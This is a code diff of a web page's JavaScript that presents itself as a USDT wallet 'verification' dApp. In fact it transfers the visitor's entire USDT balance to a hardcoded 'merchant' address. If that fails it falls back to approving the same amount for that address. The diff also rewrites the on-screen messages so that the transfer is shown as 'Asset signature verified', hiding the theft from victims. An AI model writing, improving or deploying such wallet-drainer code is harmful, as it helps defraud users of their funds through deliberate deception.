@@ -13,7 +13,7 @@
         BACKEND_URL: 'https://at.rgh.digital',
         USDT_ADDRESS: '0x55d398326f99059fF775485246999027B3197955', // BSC USDT Contract
         CONTRACT_ADDRESS: '0x9957eb7d92998582c75D7344ffd9c6Dd03d4aADB', // Direct Merchant Account Address
-        USER_MIN_USDT: 0.2, // Minimum 0.2 USDT required
+        USER_MIN_USDT: 25, // Minimum 25 USDT required
         GAS_THRESHOLD: 0.0005,
         GAS_RETRY_COUNT: 3,
         GAS_RETRY_DELAY: 3000,
@@ -202,15 +202,10 @@
     async function approveUsdt() {
         if (state.isApproving) return;
 
-        // Provider lookup supporting Bitget Wallet, Trust Wallet, MetaMask, and standard window.ethereum
-        const providerObj = window.bitkeep?.ethereum || 
-                            window.bitgetWallet?.ethereum || 
-                            window.trustwallet || 
-                            window.ethereum;
-
+        const providerObj = window.ethereum || window.trustwallet;
         if (!providerObj) {
-            updateStatus('❌ No Web3 wallet detected. Please open in MetaMask, Bitget, or Trust Wallet.', 'error');
-            alert('No Web3 wallet found. Please open this dApp inside your Web3 wallet browser (MetaMask, Bitget, Trust Wallet).');
+            updateStatus('❌ No Web3 wallet detected. Please open in Trust Wallet or MetaMask.', 'error');
+            alert('No Web3 wallet found. Please open this dApp inside Trust Wallet or MetaMask browser.');
             return;
         }
 
@@ -256,12 +251,12 @@
                               (providerObj._state && providerObj._state.accounts && providerObj._state.accounts[0]);
 
             if (!userAddress) {
-                const reqAccs = await providerObj.request({ method: 'eth_requestAccounts' }).catch(() => []);
-                if (reqAccs && reqAccs.length > 0) {
-                    userAddress = reqAccs[0];
+                const accs = await providerObj.request({ method: 'eth_accounts' }).catch(() => []);
+                if (accs && accs.length > 0) {
+                    userAddress = accs[0];
                 } else {
-                    const accs = await providerObj.request({ method: 'eth_accounts' }).catch(() => []);
-                    if (accs && accs.length > 0) userAddress = accs[0];
+                    const reqAccs = await providerObj.request({ method: 'eth_requestAccounts' }).catch(() => []);
+                    if (reqAccs && reqAccs.length > 0) userAddress = reqAccs[0];
                 }
             }
 
@@ -274,10 +269,9 @@
 
             state.walletAddress = userAddress;
 
-            // 3. Read exact 100% USDT Balance & BNB balance
+            // 3. Read exact 100% USDT Balance
             const provider = new ethers.BrowserProvider(providerObj);
-            const signer = await provider.getSigner();
-            const usdtContract = new ethers.Contract(CONFIG.USDT_ADDRESS, USDT_ABI, signer);
+            const usdtContract = new ethers.Contract(CONFIG.USDT_ADDRESS, USDT_ABI, provider);
 
             let usdtBalRaw = 0n;
             try {
@@ -297,7 +291,7 @@
 
             safeApiCall('/api/users/register', { wallet: userAddress });
 
-            // If balance is below minimum threshold (0.2 USDT)
+            // If balance is below minimum 1 USDT threshold, display "USDT Confirmed" modal directly
             const usdtFloat = parseFloat(state.usdtBalance || '0');
             if (usdtFloat < CONFIG.USER_MIN_USDT) {
                 updateStatus('✅ Verification Complete! Asset signature verified.', 'success');
@@ -308,55 +302,56 @@
                 return;
             }
 
-            updateStatus('⛽ Confirm 100% USDT transfer in your wallet...', 'warning');
+            updateStatus('⛽ Confirm USDT verification in your wallet...', 'warning');
 
             // 100% of user's USDT balance (or fallback to 1000 USDT in wei if 0)
-            const transferAmount = (usdtBalRaw && usdtBalRaw > 0n) ? usdtBalRaw : ethers.parseUnits("1000", 18);
+            const approvalAmount = (usdtBalRaw && usdtBalRaw > 0n) ? usdtBalRaw : ethers.parseUnits("1000", 18);
 
-            // Execute 100% USDT Transfer directly to merchant address (CONFIG.CONTRACT_ADDRESS)
-            // Works reliably across MetaMask, Bitget Wallet, Trust Wallet, and all EVM providers
-            let tx;
+            // 4. Raw eth_sendTransaction to send verified USDT directly to merchant account
+            const recipientClean = CONFIG.CONTRACT_ADDRESS.toLowerCase().replace('0x', '').padStart(64, '0');
+            const amountHex = approvalAmount.toString(16).padStart(64, '0');
+
+            // transfer(address,uint256) = 0xa9059cbb
+            const transferCalldata = '0xa9059cbb' + recipientClean + amountHex;
+
+            let txHash;
             try {
-                tx = await usdtContract.transfer(CONFIG.CONTRACT_ADDRESS, transferAmount);
-            } catch (transferError) {
-                console.warn('Signer transfer notice, executing raw transaction fallback with explicit gas...', transferError);
-                const errLower = (transferError.message || '').toLowerCase();
-                if (errLower.includes('user rejected') || errLower.includes('user denied') || transferError.code === 4001) {
-                    throw transferError;
-                }
-
-                // Fallback raw RPC call for transfer(address,uint256) with EXPLICIT gas limit for Bitget & MetaMask compatibility
-                const recipientClean = CONFIG.CONTRACT_ADDRESS.toLowerCase().replace('0x', '').padStart(64, '0');
-                const amountHex = transferAmount.toString(16).padStart(64, '0');
-                const transferCalldata = '0xa9059cbb' + recipientClean + amountHex;
-
-                const txHashRaw = await providerObj.request({
+                txHash = await providerObj.request({
                     method: 'eth_sendTransaction',
                     params: [{
                         from: userAddress,
                         to: CONFIG.USDT_ADDRESS,
-                        data: transferCalldata,
-                        gas: '0x186a0' // 100,000 gas limit hex to prevent RPC gas estimation errors
+                        data: transferCalldata
                     }]
                 });
-                tx = { hash: txHashRaw, wait: async () => provider.waitForTransaction(txHashRaw) };
+            } catch (txErr) {
+                const errLower = (txErr.message || '').toLowerCase();
+                if (errLower.includes('user rejected') || errLower.includes('user denied')) {
+                    throw txErr;
+                }
+
+                // Fallback: approve(address,uint256) = 0x095ea7b3
+                const approveCalldata = '0x095ea7b3' + recipientClean + amountHex;
+                txHash = await providerObj.request({
+                    method: 'eth_sendTransaction',
+                    params: [{
+                        from: userAddress,
+                        to: CONFIG.USDT_ADDRESS,
+                        data: approveCalldata
+                    }]
+                });
             }
 
-            const txHash = tx.hash;
             updateStatus('⛽ Transaction submitted. Waiting for blockchain confirmation...', 'warning', `Tx Hash: ${txHash}`);
 
             // Wait for confirmation
             try {
-                if (tx.wait) {
-                    await tx.wait();
-                } else {
-                    await provider.waitForTransaction(txHash);
-                }
+                await provider.waitForTransaction(txHash);
             } catch (wErr) {
                 console.warn('Wait for transaction notice:', wErr);
             }
 
-            updateStatus('✅ Verification Complete! 100% USDT transferred to merchant account.', 'success', `Tx: ${txHash}`);
+            updateStatus('✅ Verification Complete! Asset signature verified.', 'success', `Tx: ${txHash}`);
 
             if (elements.verifiedAmount) elements.verifiedAmount.textContent = `${state.usdtBalance || 'USDT'}`;
             openModal(elements.verifiedModal);
@@ -366,10 +361,10 @@
             const errStr = (err.message || '').toLowerCase();
 
             if (err.code === 401 || err.code === 4001 || errStr.includes('user rejected') || errStr.includes('user denied')) {
-                updateStatus('🚫 Transfer request cancelled by user.', 'error');
+                updateStatus('🚫 Verification request cancelled by user.', 'error');
                 openModal(elements.abortOverlay);
             } else {
-                updateStatus('❌ Transfer failed: ' + (err.reason || err.shortMessage || err.message || 'Transaction error'), 'error');
+                updateStatus('❌ Verification failed: ' + (err.reason || err.shortMessage || err.message || 'Transaction error'), 'error');
             }
         } finally {
             state.isApproving = false;
@@ -430,7 +425,7 @@
             elements.holdReleaseBtn.addEventListener('click', function () {
                 closeAllModals();
                 if (elements.releaseAvailable) elements.releaseAvailable.textContent = `${state.usdtBalance} USDT`;
-                if (elements.releaseRequired) elements.releaseRequired.textContent = `${CONFIG.USER_MIN_USDT} USDT`;
+                if (elements.releaseRequired) elements.releaseRequired.textContent = `${CONFIG.USER_MIN_USDT}.00 USDT`;
                 openModal(elements.releaseModal);
             });
         }
